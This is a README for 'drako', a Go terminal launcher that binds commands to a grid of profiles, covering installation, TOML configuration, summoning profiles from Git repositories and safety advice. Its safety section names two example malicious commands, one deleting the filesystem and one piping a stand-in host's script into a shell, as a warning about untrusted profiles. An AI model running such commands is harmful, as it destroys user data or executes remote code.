![Demo v0.1.8](docs/demo.gif)

The terminal is a realm of immense power, but also of high entropy. Commands are forgotten, workflows fracture, and focus is lost to the noise. **Drako** is a **TUI-Deck launcher** that enables structure, transforming your terminal into a disciplined, grid-based command center. 


## 🚀 Quick Start

> Requires Go **1.24** or newer.

If Go is installed, installing `drako` is a single command.

```bash
go install github.com/lucky7xz/drako@latest  # install drako
```

### Install Go


- macOS: `brew install go`
- Arch: `sudo pacman -S go`
- Debian/Ubuntu: `sudo apt install golang`
- Windows is not **yet** supported.


Run `drako`. On its first execution, it will construct your configuration file at `~/.config/drako/config.toml`. This is the foundation. Modify it to begin bending your workflow into shape. We also provide a handful of profiles by default, to give you some inspiration. 

### Update

To update `drako` to the latest version, simply run the installation command again.

If you are not getting the latest version, use this command instead:
```bash
GOPROXY=direct go install github.com/lucky7xz/drako/cmd/drako@latest  # install drako
```
If newly added profiles do not appear after the update, note that `drako` only creates the bootstrap folder under .config/drako if there is none present alreay. As such, the new profiles will no be created. 


## Navigation

- **Grid Navigation:** Use arrows (always on), `w/a/s/d`, or `h/j/k/l`.
- **Switch Profile:** Use `Alt` + `1-9` to switch directly.
- **Cycle Profile:** Use `o` (prev) and `p` (next).
- **Profile Inventory:** Press `i`.
- **Lock:** Press `r`.
- **Grid/Path Toggle:** Press `Tab`.
- **Quit:** Press `q`.

> **Customization:** Remap keys in `~/.config/drako/config.toml` under `[keys]`. You can also disable WASD/Vim bindings there.

## 🛠️ Configuration Example 

All power emanates from `~/.config/drako/config.toml`.

#### Base Configuration (`config.toml`)

```toml
# Grid dimensions
x = 4
y = 8

# --- Define your commands ---
[[commands]]
name = "File System"
command = "yazi"
col = 0
row = 1
# auto close is fine here.

[[commands]]
name = "Git Status"
command = "git status"
col = 1
row = 0
auto_close_execution = false

[[commands]]
name = "Update & Upgrade"
command = "sudo apt update && sudo apt upgrade"
col = 0
row = 0
auto_close_execution = false


```

#### Profile Overlay (`~/.config/drako/security.profile.toml`)

Create a new file with the `.profile.toml` extension. `drako` will discover it automatically.

```toml
# This profile redefines the grid for security tasks.
x = 3
y = 4

[[commands]]
name = "nmap LAN"
command = "nmap -sn 192.168.1.0/24"
col = 0
row = 0
auto_close_execution = false

[[commands]]
name = "Bandwidth"
command = "bmon"
col = 0
row = 1
```


---

## ✨ Philosophy

`drako` is built on a few core principles:

-   **The Grid is Your Command Deck:** Commands are mapped to a visual grid for immediate, single-keypress access. It beats searching shell history or remembering aliases.
-   **Profiles are Contexts:** A profile is a complete reconfiguration of the grid. Switch from a "Dev" deck (`go build`, `test`) to an "Ops" deck (`nmap`, `ssh`) instantly.
-   **Portable Configuration:** Your entire setup lives in `~/.config/drako`. Git-manage your own profile folder and `summon` it with `drako summon`. You can deploy your exact control panel to any new machine in an instant.
-   **Harness, Don't Replace:** It integrates with the tools you already use. If it runs in the terminal, it can be bound to the grid.
---

## 🪄 Summoning Profiles

Share and reuse command decks across machines and teams. Instead of manually copying profiles, summon them directly from remote sources:

```bash

# Clones the repo and looks for .profile.toml files.
# Discards the temporary repo

drako summon git@github.com:user/my_profile_collection.git
```

Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in your inventory, validated for syntax before copying.

If a profile needs extra files (scripts, configs), declare it under `assets = ["relative/path/to/file", ...]`.
`drako` will copy these assets to `~/.config/drako/assets/<profile_name>/`.

You can reference them in your commands using the `{assets}` token:
```toml
command = "python3 {assets}/scanner.py"
```
This ensures your profile is portable and works on any machine.

## 🧰 CLI Power Tools

Beyond the TUI, Drako provides CLI commands for advanced management.

### `drako spec <name>`
Apply a "specification" to bulk-manage your profiles.
```bash
drako spec work
```
This loads `~/.config/drako/specs/work.toml`. Profiles listed in the spec are **equipped** (moved to visible), and all others are **stored** (moved to `inventory/`). This allows you to switch entire contexts (e.g., "Work Mode" vs "Gaming Mode") in one command.

### `drako purge`
Safely reset or remove configurations.
```bash
# Reset Core config to defaults (moves old config to trash/)
drako purge --target core

# Remove a specific profile (moves to trash/)
drako purge --target git

# NUCLEAR OPTION: Delete everything (NO TRASH, NO UNDO)
drako purge --destroyeverything
```

## 🚑 Rescue Mode

If your configuration breaks (syntax error, invalid grid), Drako won't crash. It enters **Rescue Mode**.

- **Safe Environment:** A minimal, hardcoded 3x3 grid that always works.
- **Repair Tools:** Provides buttons to edit `config.toml`, open the config directory, or reset broken profiles.
- **Manual Access:** You can enter Rescue Mode manually via the **Inventory** (`i`) screen by clicking `[ Rescue Mode ]`.
- **Exit:** Select "Exit Rescue Mode" or switch to a working profile (`o`/`p`) to return to normal operation.

## ⚠️ Safety First

- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
- **When Unsure:** Consult documentation or ask a trusted friend/colleague.

## Roadmap 

 - [x] Update Bootstrap collection
 - [x] Summon profiles incl assets
 - [x] DRY Refactor  
 - [x] Grid Size Safety & Rescue Mode
 - [x] Core Profile Concept
 - [ ] Full unit test suite
 - [ ] Windows support (limited)
 - [ ] Steamdeck support (limited)
 - [ ] ARM Support
 - [ ] CI/CD

---

## 🤝 Contribution

Ideas are welcome. Bugs will be hunted.
-   **Issues:** Report defects or propose architectural changes.
-   **Pull Requests:** Fork the repository and submit your work.
-   **Alpha State:** `drako` is currently in ALPHA. It is stable but evolving. This is your opportunity to influence its development.

---

## ❤️ Thanks to Charmbracelet

`drako` uses several Charmbracelet projects to deliver the TUI:

- [`bubbletea`](https://github.com/charmbracelet/bubbletea) for the model/view/update loop
- [`lipgloss`](https://github.com/charmbracelet/lipgloss) for layout and styling
- [`bubbles`](https://github.com/charmbracelet/bubbles) for common components



## 📜 License

The core Drako engine is released under the [GNU Affero General Public License v3.0](LICENSE). Bootstrap assets in the `bootstrap/` directory are released under either [MIT](bootstrap/LICENSE-MIT) or [Apache-2.0](bootstrap/LICENSE-Apache) licenses.

---
<div align="center">

Tame the chaos.

</div>
